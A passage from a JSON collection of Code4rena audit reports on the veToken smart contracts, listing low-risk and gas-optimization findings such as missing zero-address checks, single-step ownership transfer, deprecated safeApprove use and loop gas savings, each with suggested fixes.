}\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L442-L452\n\n```solidity\nfunction withdrawTo(\n        uint256 _pid,\n        uint256 _amount,\n        address _to\n    ) external returns (bool) {\n        address rewardContract = poolInfo[_pid].veAssetRewards;\n        require(msg.sender == rewardContract, \"!auth\");\n        // @audit require(_to != address(0));\n        _withdraw(_pid, _amount, msg.sender, _to);\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L95-L107\n\n```solidity\n constructor(\n        uint256 pid_,\n        address stakingToken_,\n        address rewardToken_,\n        address operator_,\n        address rewardManager_\n    ) {\n        pid = pid_;\n        stakingToken = IERC20(stakingToken_);\n        rewardToken = IERC20(rewardToken_);\n        operator = operator_;\n        rewardManager = rewardManager_;\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L96-L100\n\n```solidity\nconstructor(address stakingToken_, address rewardManager_) {\n        stakingToken = IERC20(stakingToken_);\n\n        rewardManager = rewardManager_;\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L102-L116\n\n```solidity\n   function addReward(\n        address _rewardToken,\n        address _veAssetDeposits,\n        address _ve3TokenRewards,\n        address _ve3Token\n    ) external onlyOwner {\n        rewardTokenInfo[_rewardToken].veAssetDeposits = _veAssetDeposits;\n        rewardTokenInfo[_rewardToken].ve3TokenRewards = _ve3TokenRewards;\n        rewardTokenInfo[_rewardToken].ve3Token = _ve3Token;\n        rewardTokens.add(_rewardToken);\n    }\n\n    function addOperator(address _newOperator) public onlyOwner {\n        operators.add(_newOperator);\n    }\n```\n#### Recommendation\nAdd `address(0)` checks.\n\n### [L-02] Use Two-Step Transfer Pattern for Access Controls\n#### Impact\nContracts implementing access control's, e.g. `owner`, should consider implementing a Two-Step Transfer pattern.\nOtherwise it's possible that the role mistakenly transfers ownership to the wrong address, resulting in a loss of the role\n#### Proof of Concept\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L53-L57\n\n```solidity\nfunction setFeeManager(address _feeManager) external {\n        require(msg.sender == feeManager, \"!auth\");\n        feeManager = _feeManager;\n        emit FeeManagerUpdated(_feeManager);\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L123-L139\n\n```solidity\nfunction setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n        emit OwnerUpdated(_owner);\n    }\n\n    function setFeeManager(address _feeM) external {\n        require(msg.sender == feeManager, \"!auth\");\n        feeManager = _feeM;\n        emit FeeManagerUpdated(_feeM);\n    }\n\n    function setPoolManager(address _poolM) external {\n        require(msg.sender == poolManager, \"!auth\");\n        poolManager = _poolM;\n        emit PoolManagerUpdated(_poolM);\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L168-L172\n\n```solidity\n    function setVoteDelegate(address _voteDelegate) external {\n        require(msg.sender == voteDelegate, \"!auth\");\n        voteDelegate = _voteDelegate;\n        emit VoteDelegateUpdated(_voteDelegate);\n    }\n```\n#### Recommendation\nConsider following the example below where the new role will have to accept.\n\nExample\n```solidity\naddress owner;\naddress pendingOwner;\n\n// ...\n\nfunction setPendingOwner(address newPendingOwner) external {\n    require(msg.sender == owner, \"!owner\");\n    emit NewPendingOwner(newPendingOwner);\n    pendingOwner = newPendingOwner;\n}\n\nfunction acceptOwnership() external {\n    require(msg.sender == pendingOwner, \"!pendingOwner\");\n    emit NewOwner(pendingOwner);\n    owner = pendingOwner;\n    pendingOwner = address(0);\n}\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L62-L65\n\n```solidity\nfunction setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n    }\n```\n### [L-03] Require owner\n#### Impact\nRequire owner to set priviledged addresses.\n#### Proof of Concept\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L129-L139\n\n```diff\n    function setFeeManager(address _feeM) external {\n-       require(msg.sender == feeManager, \"!auth\");\n+       require(msg.sender == owner, \"!auth\")\n        feeManager = _feeM;\n        emit FeeManagerUpdated(_feeM);\n    }\n\n    function setPoolManager(address _poolM) external {\n-       require(msg.sender == poolManager, \"!auth\");\n+       require(msg.sender == owner, \"!auth\")\n        poolManager = _poolM;\n        emit PoolManagerUpdated(_poolM);\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L168-L172\n\n```diff\n    function setVoteDelegate(address _voteDelegate) external {\n-       require(msg.sender == voteDelegate, \"!auth\");\n+       require(msg.sender == owner, \"!auth\")\n        voteDelegate = _voteDelegate;\n        emit VoteDelegateUpdated(_voteDelegate);\n    }\n```\n#### Recommendation\nUse `require (msg.sender == owner, \"!auth\")` for all the functions that need authorization when assigning a new address to a role.\n\n### [L-04] Do not use Deprecated Library Functions\n#### Impact\nThe usage of deprecated library functions should be discouraged.\n#### Proof of Concept\n```solidity\n  Booster.sol::374 => IERC20(token).safeApprove(rewardContract, _amount);\n  VE3DRewardPool.sol::287 => IERC20(_rewardToken).safeApprove(rewardTokenInfo[_rewardToken].veAssetDeposits, 0);\n  VE3DRewardPool.sol::288 => IERC20(_rewardToken).safeApprove(\n  VE3DRewardPool.sol::301 => IERC20(rewardTokenInfo[_rewardToken].ve3Token).safeApprove(\n  VE3DRewardPool.sol::305 => IERC20(rewardTokenInfo[_rewardToken].ve3Token).safeApprove(\n  VeAssetDepositor.sol::162 => IERC20(minter).safeApprove(_stakeAddress, _amount);\n  VoterProxy.sol::101 => IERC20(_token).safeApprove(_gauge, 0);\n  VoterProxy.sol::102 => IERC20(_token).safeApprove(_gauge, balance);\n  VoterProxy.sol::152 => IERC20(veAsset).safeApprove(escrow, 0);\n  VoterProxy.sol::153 => IERC20(veAsset).safeApprove(escrow, _value);\n  VoterProxy.sol::160 => IERC20(veAsset).safeApprove(escrow, 0);\n  VoterProxy.sol::161 => IERC20(veAsset).safeApprove(escrow, _value);\n```\n#### Recommendation\nUse `safeIncreaseAllowance` / `safeDecreaseAllowance` instead of `safeApprove`.\n\n## Non-Critical\n### [N-01] Typo\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L93\n\n```diff\n-    //increase ammount\n+    //increase amount\n```\n#### Tools used\nmanual, slither\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/241"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Vulnerabilities\n### 1. Update asset weight when calling `VeTokenMinter.removeOperator`\n\nWhen removing operator, there is no check to make sure that `veAssetWeights[operator]` has been removed. If governance forgot to call `updateveAssetWeight` before removing the operator, `totalWeight` would be inflated and user would get lesser amount when claiming reward:\n```\nuint256 _veAssetEarned = _amount.mul(veTokenMinter.veAssetWeights(address(this))).div(\n    veTokenMinter.totalWeight()\n);\n```\n\n#### Recommended Mitigation\nEnsure that weight is updated to zero when removing operator:\n```\nfunction removeOperator(address _operator) public onlyOwner {\n    updateveAssetWeight(_operator, 0); // modify visibility to public\n    operators.remove(_operator);\n}\n```\n\n#### Relevant Links\n- https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L36-L46\n- https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L607-L609\n\n### 2. Missing duplicate check in `VE3DRewardPool.addReward`\nDuplicates in `rewardTokens` could cause irregular behaviour in the system. \n\nUnfortunately we didn't have enough time to test whether a duplicate could break functionalities in the system (especially during `VE3DRewardPool.getReward`). Recommend to prevent the possibility of duplication as the duplicated element cannot be removed and it would cost more gas than necessary when iterating over `rewardTokens`.\n\n#### Recommended Mitigation\nAdd a check to ensure `_rewardToken` isn't already added:\n```\nfunction addReward(\n    address _rewardToken,\n    address _veAssetDeposits,\n    address _ve3TokenRewards,\n    address _ve3Token\n) external onlyOwner {\n    rewardTokenInfo[_rewardToken].veAssetDeposits = _veAssetDeposits;\n    rewardTokenInfo[_rewardToken].ve3TokenRewards = _ve3TokenRewards;\n    rewardTokenInfo[_rewardToken].ve3Token = _ve3Token;\n    \n    if (!rewardTokens.contains(_rewardToken)) {\n        rewardTokens.add(_rewardToken);\n    }\n}\n```\n\n#### Relevant Links\n- https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L102-L112\n- https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L281-L321\n\n### 3. Depositors can supply arbitrary `_stakeAddress`\n\nMalicious depositor could call `VeAssetDepositor.deposit` with a custom `_stakeAddress` contract, leading to unexpected behaviour.\n```\nfunction deposit(\n    uint256 _amount,\n    bool _lock,\n    address _stakeAddress\n) public {\n    ...\n    //mint here\n    ITokenMinter(minter).mint(address(this), _amount);\n    //stake for msg.sender\n    IERC20(minter).safeApprove(_stakeAddress, _amount);\n    IRewards(_stakeAddress).stakeFor(msg.sender, _amount);\n    ...\n}\n```\nFor instance, someone could supply a contract that did nothing when `stakeFor` is called, leaving the token in the contract and unused allowance.\n\nWhile it currently doesn't negatively impact the system, future changes on the code might not consider this and could potentially make a false assumption. In addition, analytics that track `Deposited` event might record wrong values.\n\n#### Recommended Mitigation\nConsider adding a token balance check before and after `stakeFor` to ensure token is actually staked, or alternatively, add a whitelist for `_stakeAddress`.\n\n#### Relevant Links\n- https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L127-L167",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/234"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# GAS OPT\n\n1. Title : Using `++i` than `i++` for saving more gas\n\nUsing `i++` instead `++i` for  all the loops, the variable i is incremented using i++. It is known that implementation by using `++i` costs less gas per iteration than `i++`.\n\n## Tools Used\nManual Review\n\n## Occurances\n\n```\nmain/contracts/Booster.sol#L329                for (uint256 i = 0; i < poolInfo.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < poolInfo.length; i++) { \nmain/contracts/BaseRewardPool.sol#L176         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L199         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L218         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L244         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/VE3DRewardPool.sol#L148         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VE3DRewardPool.sol#L214         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L238         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L257         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L281         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VE3DRewardPool.sol#L326         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VoterProxy.sol#L217             for (uint256 i = 0; i < _tokenVote.length; i++) {\n```\n\n2. Title : change `uint256 i = 0` into `uint256 i` for saving more gas\n\nusing this implementation can saving more gas for each loops.\n\n## Tool Used\nManual Review\n\n## Recommended Mitigation\nChange it\n\n## Occurances\n\n```\nmain/contracts/Booster.sol#L329                for (uint256 i = 0; i < poolInfo.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < poolInfo.length; i++) { \nmain/contracts/BaseRewardPool.sol#L176         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L199         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L218         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L244         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/VE3DRewardPool.sol#L148         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VE3DRewardPool.sol#L214         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L238         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L257         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VE3DRewardPool.sol#L281         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VE3DRewardPool.sol#L326         for (uint256 i = 0; i < length; i++) {\nmain/contracts/VoterProxy.sol#L217             for (uint256 i = 0; i < _tokenVote.length; i++) {\n```\n\n3. Title : Caching array length can saving more gas\n\nThis implementation can be saving more gas, since if caching the array length is more gas efficient.\njust because access to a local variable in solidity is more efficient.\n\n## Tool Used\nManual Review\n\n## Occurances\n\n```\nmain/contracts/Booster.sol#L329                for (uint256 i = 0; i < poolInfo.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < poolInfo.length; i++) { \nmain/contracts/BaseRewardPool.sol#L176         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L199         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L218         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L244         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/BaseRewardPool.sol#L282         for (uint256 i = 0; i < extraRewards.length; i++) {\nmain/contracts/VE3DRewardPool.sol#L148         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VE3DRewardPool.sol#L281         for (uint256 i = 0; i < rewardTokens.length(); i++) {\nmain/contracts/VoterProxy.sol#L217             for (uint256 i = 0; i < _tokenVote.length; i++) {\n```\n\n4. Title : Using > 0 costs more gas than != 0 when used on uints in a require() statement\n\n1.) File : contracts/VeAssetDepositor.sol ([Line.132](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L132))\n\n```\n        require(_amount > 0, \"!>0\");\n```\n\n2.) FIle : contracts/BaseRewardPool.sol ([Line.215](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L215))\n\n```\n        require(amount > 0, \"RewardPool : Cannot withdraw 0\");\n```\n\n3.) File : contracts/BaseRewardPool.sol ([Line.173](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L173))\n\n```\n        require(_amount > 0, \"RewardPool : Cannot stake 0\");\n```\n4.) File : contracts/BaseRewardPool.sol ([Line.196](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L196))\n\n```\n        require(_amount > 0, \"RewardPool : Cannot stake 0\");\n```\n5.) contracts/BaseRewardPool.sol ([Line.215](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L215))\n\n```\n        require(amount > 0, \"RewardPool : Cannot withdraw 0\");\n```\n6.) File : contracts/VE3DRewardPool.sol ([Line.210](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L210))\n\n```\n        require(_amount > 0, \"RewardPool : Cannot stake 0\");\n```\n7.) File : contracts/VE3DRewardPool.sol ([Line.234](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L234))\n\n```\n        require(_amount > 0, \"RewardPool : Cannot stake 0\");\n```\n\n8.) File : contracts/VE3DRewardPool.sol ([Line.254](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L254))\n\n```\n        require(_amount > 0, \"RewardPool : Cannot stake 0\");\n```\n5. Title : Saving gas by removing ` = 0`\n\nThis implementation code can be saving more gas by removing = 0, it because If a variable was not set/initialized, it is assumed to have default value to 0\n\n## Tool Used\nManual Review \n\n## Mitigation Step\nRemove `= 0`\n\n## Occurances\n\n```\nmain/contracts/BaseRewardPool.sol#L274             rewards[_account] = 0;\nmain/contracts/VeAssetDepositor.sol#L28             uint256 public incentiveVeAsset = 0;\nmain/contracts/VeAssetDepositor.sol#L119            incentiveVeAsset = 0;\nmain/contracts/VeAssetDepositor.sol#L141            incentiveVeAsset = 0;\nmain/contracts/BaseRewardPool.sol#L66               uint256 public periodFinish = 0;\nmain/contracts/BaseRewardPool.sol#L67               uint256 public rewardRate = 0;\nmain/contracts/BaseRewardPool.sol#L70                uint256 public queuedRewards = 0;\nmain/contracts/BaseRewardPool.sol#L71                uint256 public currentRewards = 0;\nmain/contracts/BaseRewardPool.sol#L72                uint256 public historicalRewards = 0;\nmain/contracts/VE3DRewardPool.sol#L361             rewardTokenInfo[_rewardToken].queuedRewards = 0;\n```\n\n6. Title : Value can be set as immutable \n\nThis can be set as immutable for saving more gas\n\n## Tool Used \nRemix\n\n## Recommended Mitigation \n\nadd `immutable`\n\n## Occurances \n\n1.) File : contracts/VeTokenMinter.sol ([Line.16](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L16))\n\n```\n    ERC20 public veToken;\n```\n\n2.) File : contracts/VoterProxy.sol ([Line.31](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L31))\n\n```\n    IVoteEscrow.EscrowModle public escrowModle;\n```\n\n3.) File : contracts/BaseRewardPool.sol ([Lines.55-56](https://github.com/code-423n4/2022-05-vetoken/blob/main/contracts/BaseRewardPool.sol#L55-L56))\n\n```\n    IERC20 public rewardToken;\n    IERC20 public stakingToken;\n```\n4.) File : contracts/BaseRewardPool.sol ([Lines.62-63](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L62-L63))\n\n```\n    address public operator;\n    address public rewardManager;\n```\n\n7. reorder function `addExtraReward` for saving more gas\n\nhttps://github.com/code-423n4/2022-05-vetoken/blob/main/contracts/BaseRewardPool.sol#L121-L129\n\nthis implementation below can be saving +- 200 gas\n\n## Tool Used\nManual Review, Remix\n\n## Recommended Mitigation  \n\n```\n    function addExtraReward(address _reward) external returns (bool) {\n        require(_reward != address(0), \"!reward setting\"); // => this can be excecuted first\n        require(msg.sender == rewardManager, \"!authorized\");\n        require(extraRewards.length < EXTRA_REWARD_POOLS, \"!extra reward pools exceed\");\n\n\n        extraRewards.push(_reward);\n        emit ExtraRewardAdded(_reward);\n        return true; \n    }\n// 3676423 before changed \n// 3676216 after changed (saving +- 200 gas)\n```\n\n8. Title : public functions should be declared external for saving more gas\n\n1.) File : contracts/BaseRewardPool.sol ([Line.196](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L195))\n\n```\n    function stakeFor(address _for, uint256 _amount) public updateReward(_for) returns (bool) {\n```\n2.) File : contracts/Booster.sol ([Line.434](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L434))\n\n```\n    function withdrawAll(uint256 _pid) public returns (bool) {\n```\n3.) File : contracts/VeTokenMinter.sol ([Line.32](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L32))\n\n```\n    function addOperator(address _newOperator) public onlyOwner {\n```\n\n4.) File : contracts/VeTokenMinter.sol ([Line.36](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L36))\n\n```\n        function removeOperator(address _operator) public onlyOwner {\n```\n\n\n9. Title Caching in `calldata` instead of `memory`\n\n1.) File : contracts/VoterProxy.sol ([Line.199](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L199))\n\n```\n    function isValidSignature(bytes32 _hash, bytes memory) public view returns (bytes4) {\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/230"
    }
  },
  {
    "title": "QA Report",
    "body": "# Headline\r\nNot having emits on critical functions \r\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L90\r\n\r\n\r\nemit LockUpdated(veAssetBalanceStaker, unlockTime\r\n     mayabe emit also  the unlockat so you can query  the data can be helpful\r\n\r\n\r\n if this doesn't fail its dead code because veaset staker can only be zero either on deployment or on first call to this function\r\n       uint256 veAssetBalanceStaker = IERC20(veAsset).balanceOf(staker);\r\n       if (veAssetBalanceStaker == 0) {\r\n           return;\r\n       }\r\nThis code is very rare to happen because to get into the system balance of staker is more then zero\r\n\r\n\r\nPrecision error multiplication first because you can have presion errors\r\nuint256 unlockInWeeks = (unlockAt / WEEK) * WEEK;\r\n\r\n\r\nif (veVeAsset == 0) {\r\n           uint256 unlockAt = block.timestamp + maxTime;\r\n           uint256 unlockInWeeks = (unlockAt / WEEK) * WEEK;\r\n\r\n           //release old lock if exists\r\n           IStaker(staker).release();\r\n           //create new lock\r\n           uint256 veAssetBalanceStaker = IERC20(veAsset).balanceOf(staker);\r\n           IStaker(staker).createLock(veAssetBalanceStaker, unlockAt);\r\n           unlockTime = unlockInWeeks;\r\n           emit InitialLockCreated(veAssetBalanceStaker, unlockInWeeks);\r\n       }\r\nYou can easily skip this logic because it only executes veveAsset ==0 is very rare.\r\njust like the case above  ^\r\n\r\n\r\n comment on how this function works with comments, there are not comments or natspec how this function works\r\nLockasset function\r\n\r\n\r\nIStaker(staker).increaseTime(unlockAt);\r\n          add to make sure that if succeeds    and the function that is not updating anything in this function \r\nmake it in require statement\r\n\r\n\r\nunlocktime = unlock weeks have a require statement here and make sure it  happens here\r\n      you are doing unnecessary  state variable make into memory variable \r\nissue make this more readable because user might not know what is going on  you're not saying why it's reverting\r\nrequire(_amount > 0, \"!>0\");\r\n\r\n\r\nno check for address zero \r\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L130\r\n \r\nand no return, not good for other contracts implementing this function \r\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L130\r\n\r\n\r\n  if (_lock) { \r\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L134\r\n\r\n             dont give user able to lock there should be onlylock  modifer so you dont have a choice on what ot do or you can make  2 functions one for locking and the other \r\n\r\n\r\n\r\n\r\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/229"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA\n\n\n## Missing events or not emitted\n\nIn the `Booster`: The constructor not emit the `OwnerUpdated`, `FeeManagerUpdated`, `PoolManagerUpdated` and `VoteDelegateUpdated` events\n\nThe `VoterProxy`, `VeTokenMinter` only have one event\n\nEmit an event when the storage change or when some important happend\n\n## Inherit from interface\n\nIf define a interface like `IRewards`, inherit from that, this is helpfull to avoid interface implementations mistake and clarify code \n\n\n## Missing safeApprove(0) before increasing approve\n\nSome tokens (like [USDT L199](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n[Booster.sol:L374](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L374)\n\nMitigation, change\n```IERC20(token).safeApprove(rewardContract, _amount);```\nto:\n```\nIERC20(token).safeApprove(rewardContract, 0);\nIERC20(token).safeApprove(rewardContract, _amount);\n```\n\n[VeAssetDepositor.sol:L162](https://github.com/code-423n4/2022-05-vetoken/blob/1be2f03670e407908f175c08cf8cc0ce96c55baf/contracts/VeAssetDepositor.sol#L162)\n\nChange\n```IERC20(minter).safeApprove(_stakeAddress, _amount);```\nto:\n```\nIERC20(minter).safeApprove(_stakeAddress, 0);\nIERC20(minter).safeApprove(_stakeAddress, _amount);\n```\n\n## Add reentracy guard to `getReward`\n\nOn [`VE3DLocker.sol#L719`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DLocker.sol#L719) you use a reentrancy guard.\n\nConsider adding a reentrancy guard also to [`VE3DRewardPool.sol#L275`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L275)",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/228"
    }
  },
  {
    "title": "QA Report",
    "body": "# No two-step process for critical ownership transfer\n\n## Impact\n\nThe current admin transfer process involves the current admin calling TransparentUpgradeableProxy.changeAdmin(). This function checks the new admin address is not the zero address and proceeds to update the admin slot. If the nominated EOA account is not a valid account, it is entirely possible the admin might be accidentally transferred to an uncontrolled account, breaking all functions with the ifAdmin() modifier.\n\n## Proof-of-Concept\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L123](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L123)\n\n```\nfunction setOwner(address _owner) external {\n    require(msg.sender == owner, \"!auth\");\n    owner = _owner;\n    emit OwnerUpdated(_owner);\n}\n```\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L62](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L62)\n\n```\nfunction setOwner(address _owner) external {\n    require(msg.sender == owner, \"!auth\");\n    owner = _owner;\n}\n```\n\n## Recommended Mitigation Steps\n\nConsider implementing a two step process where the admin nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n## Reference\n\nhttps://github.com/code-423n4/2021-08-notional-findings/issues/94\n\n\n\n# SafeApprove Has Been Deprecated \n\n## Proof-of-Concept\n\nOpenZeppelin SafeERC20 `safeApprove()` function was found to be used in a number of contracts. This function has been deprecated. Refer to the comments in the SafeERC20's source code.\n\nAn example of the usage of `safeApprove()` is shown below:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/828fe365eeff13e7aa188e449005ad81f7222189/contracts/token/ERC20/utils/SafeERC20.sol#L39-L44\n\n```solidity\n/**\n * @dev Deprecated. This function has issues similar to the ones found in\n * {IERC20-approve}, and its usage is discouraged.\n *\n * Whenever possible, use {safeIncreaseAllowance} and\n * {safeDecreaseAllowance} instead.\n */\nfunction safeApprove(\n    IERC20 token,\n    address spender,\n    uint256 value\n) internal {\n    // safeApprove should only be called when setting an initial allowance,\n    // or when resetting it to zero. To increase and decrease it, use\n    // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n    require(\n        (value == 0) || (token.allowance(address(this), spender) == 0),\n        \"SafeERC20: approve from non-zero to non-zero allowance\"\n    );\n    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n}\n```\n\n## Recommended Mitigation Steps\n\nUse `safeIncreaseAllowance()` instead 